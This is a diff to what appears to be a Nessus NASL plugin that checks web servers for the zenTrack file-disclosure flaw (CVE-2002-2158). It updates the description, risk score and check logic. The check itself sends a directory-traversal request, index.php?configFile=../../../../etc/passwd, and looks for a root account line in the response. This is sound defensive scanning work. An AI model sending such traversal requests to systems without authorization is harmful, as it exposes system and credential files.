@@ -13,27 +13,44 @@
 if(description)
 {
  script_id(11708);
- script_version ("$Revision: 1.2 $");
+ script_cve_id("CVE-2002-2158");
+ script_bugtraq_id(4973, 7843, 7844);
+ script_version ("$Revision: 1.12 $");
 
- name["english"] = "zentrack files reading";
+ name["english"] = "zenTrack Files Reading";
 
  script_name(english:name["english"]);
  
  desc["english"] = "
+Synopsis :
+
+The remote web server contains a PHP script that is prone to file
+disclosure attacks. 
+
+Description :
+
 It is possible to make the remote web server show the content
 of arbitrary files by making requests like :
 
-	index.php?configFile=../../../../etc/passwd
+  index.php?configFile=../../../../../../../../../../etc/passwd
 
-Solution : Upgrade to the latest version
-Risk factor : Serious";
+See also : 
 
+http://www.securityfocus.com/archive/1/324264/2003-06-04/2003-06-10/0
 
+Solution : 
+
+Upgrade to zenTrack 2.4.2 or later.
+
+Risk factor : 
+
+Low / CVSS Base Score : 2.3
+(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
 
 
  script_description(english:desc["english"]);
  
- summary["english"] = "Checks for the presence of index.php";
+ summary["english"] = "Checks for the presence of zenTrack's index.php";
  
  script_summary(english:summary["english"]);
  
@@ -45,8 +62,9 @@ Risk factor : Serious";
  family["english"] = "CGI abuses";
  family["francais"] = "Abus de CGI";
  script_family(english:family["english"], francais:family["francais"]);
- script_dependencie("find_service.nes", "http_version.nasl");
+ script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
 }
 
@@ -58,29 +76,27 @@ Risk factor : Serious";
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port) port = 80;
+port = get_http_port(default:80);
+
 if(!get_port_state(port))exit(0);
+if(!can_host_php(port:port))exit(0);
 
 
 
 function check(loc)
 {
- req = http_get(item:string(loc, "/index.php?configFile=../../../../../../../etc/passwd"), port:port);
- r = http_keepalive_send_recv(port:port, data:req);
+ req = http_get(item:string(loc, "/index.php?configFile=../../../../../../../../../etc/passwd"), port:port);
+ r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if( r == NULL )exit(0);
  if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
  {
- 	security_hole(port);
+ 	security_note(port);
 	exit(0);
  }
 }
 
 
-dirs = make_list("", cgi_dirs());
-
-
-foreach dir (dirs)
+foreach dir ( cgi_dirs() )
 {
  check(loc:dir);
 }
